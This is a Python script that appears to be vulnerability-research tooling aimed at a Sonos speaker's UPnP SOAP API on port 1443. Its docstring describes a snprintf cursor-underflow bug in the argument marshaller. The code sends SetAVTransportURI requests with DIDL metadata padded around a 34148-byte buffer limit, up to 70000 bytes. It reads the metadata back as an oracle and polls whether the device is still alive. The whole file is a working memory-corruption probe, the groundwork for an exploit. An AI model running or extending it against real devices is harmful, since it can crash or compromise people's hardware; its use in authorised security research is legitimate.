#!/usr/bin/env python3
"""jc7 — drive the 34148-byte inline-buffer wall of the :1443 UPnP arg marshaller.

0x509d68..0x509d40 (findings2 §8): the element writer calls
    __snprintf_chk(*cursor, end-cursor+1, 1, -1, "<%s>%s</%s>", name, value, name)
so the FIRST element's maxlen is the whole remaining inline buffer (34148 B, li v1,34148
at 0x509c44) and the cursor is then advanced by snprintf's FULL return. Any element taller
than the buffer is cut at 34148 B, and the cursor lands past `end`, so the unsigned
`end-cursor` underflows and the grow branch is skipped for every later element.

Oracle: AVTransport SetAVTransportURI(CurrentURIMetaData=<DIDL>) then GetMediaInfo →
CurrentURIMetaData is echoed verbatim by the device (proven 387 B round-trip). A cut SOAP
element therefore shows up as a short read-back / a lost epilogue. The metadata element is
sent FIRST so it is the one whose maxlen is the whole buffer.
"""
import json, os, re, subprocess, sys, threading, time

IP = os.environ.get("IP", "192.168.6.112")
U = os.environ.get("U", "RINCON_5CAAFD21D47001400")
OUT = os.environ.get("OUT", "recon/jc7/wall_burn.tsv")
SPACING = float(os.environ.get("SPACING", "2"))
URL = f"https://{IP}:1443/api/v1/players/{U}/upnpAVTransport"
PRO = ('<DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
       'xmlns:dc="http://purl.org/dc/elements/1.1/" '
       'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/">'
       '<item id="-1" parentID="-1" restricted="true"><dc:title>')
EPI = ('ENDMARK</dc:title>'
       '<upnp:class>object.item.audioItem.musicTrack</upnp:class>'
       '<res protocolInfo="http-get:*:audio/mpeg:*">https://example.com/jc7.mp3</res>'
       '</item></DIDL-Lite>')

def didl(total):
    pad = max(0, total - len(PRO) - len(EPI))
    return PRO + "A" * pad + EPI

def post(method, args):
    open("/tmp/jc7_wb.json", "w").write(json.dumps({"method": method, "input": args}))
    r = subprocess.run(["curl", "-sk", "-m", "40", "--http1.1", "-X", "POST",
                        "-H", "X-Sonos-Api-Key: x", "-H", "Content-Type: application/json",
                        "--data-binary", "@/tmp/jc7_wb.json", "-w", "%{http_code}", URL],
                       capture_output=True, text=True)
    body = r.stdout[:-3] if len(r.stdout) >= 3 else ""
    code = r.stdout[-3:]
    try:
        j = json.loads(body)
    except Exception:
        j = {}
    return code, j

poll_stop = threading.Event()
def poller():
    with open(OUT + ".poll", "w") as f:
        while not poll_stop.is_set():
            r = subprocess.run(["curl", "-s", "-m", "2", "-o", "/dev/null",
                                "-w", "%{http_code}",
                                f"http://{IP}:1400/status/VERSION"],
                               capture_output=True, text=True)
            f.write(f"{time.strftime('%H:%M:%S')} {r.stdout}\n"); f.flush()
            time.sleep(0.1)

def main():
    log = open(OUT, "w")
    log.write("ts\tcase\tsent_bytes\thttp\trc\trb_len\trb_tail\trb_head\n")
    threading.Thread(target=poller, daemon=True).start()
    for total in (400, 5000, 20000, 30000, 33000, 34100, 34140, 34148, 34150, 34200,
                  35000, 40000, 70000):
        d = didl(total)
        args = [{"name": "CurrentURIMetaData", "value": d},
                {"name": "InstanceID", "value": "0"},
                {"name": "CurrentURI", "value": "https://example.com/jc7.mp3"}]
        code, j = post("SetAVTransportURI", args)
        rc = j.get("result", "-")
        time.sleep(0.7)
        _, g = post("GetMediaInfo", [{"name": "InstanceID", "value": "0"}])
        rb = ""
        if g.get("result") == 0:
            for p in g.get("parameters", []):
                if p["name"] == "CurrentURIMetaData":
                    rb = p["value"]
        got_mark = "ENDMARK" in rb
        log.write(f"{time.strftime('%H:%M:%S')}\tmeta{total}\t{len(d)}\t{code}\t{rc}\t"
                  f"{len(rb)}\t{rb[-24:]!r}\t{(rb[:40] + '|' + ('MARK' if got_mark else 'noMARK'))!r}\n")
        log.flush()
        print(f"meta{total:<6} sent={len(d):<6} http={code} rc={rc} rb_len={len(rb)} "
              f"mark={'YES' if got_mark else 'no'}", flush=True)
        time.sleep(SPACING)
    # second-element shape: huge metadata first, the two short args after it
    for total in (34148, 40000):
        d = didl(total)
        args = [{"name": "CurrentURIMetaData", "value": d},
                {"name": "InstanceID", "value": "0"},
                {"name": "CurrentURI", "value": "https://example.com/jc7.mp3"}]
        code, j = post("SetAVTransportURI", args)
        rc = j.get("result", "-")
        time.sleep(0.7)
        _, g = post("GetMediaInfo", [{"name": "InstanceID", "value": "0"}])
        cur = next((p["value"] for p in g.get("parameters", []) if p["name"] == "CurrentURI"), "")
        rb = next((p["value"] for p in g.get("parameters", []) if p["name"] == "CurrentURIMetaData"), "")
        log.write(f"{time.strftime('%H:%M:%S')}\tafter{total}\t{len(d)}\t{code}\t{rc}\t"
                  f"{len(rb)}\tcur={cur!r}\tmark={'ENDMARK' in rb}\n")
        log.flush()
        print(f"after{total:<6} http={code} rc={rc} cur={cur!r} rb_len={len(rb)}", flush=True)
        time.sleep(SPACING)
    alive = subprocess.run(["curl", "-s", "-m", "4", "-o", "/dev/null", "-w", "%{http_code}",
                            f"http://{IP}:1400/status/VERSION"], capture_output=True, text=True).stdout
    log.write(f"{time.strftime('%H:%M:%S')}\tBATCH_END\t-\t{alive}\t-\t-\t-\t-\n")
    log.close(); poll_stop.set()
    print("BATCH_END", alive, flush=True)

main()
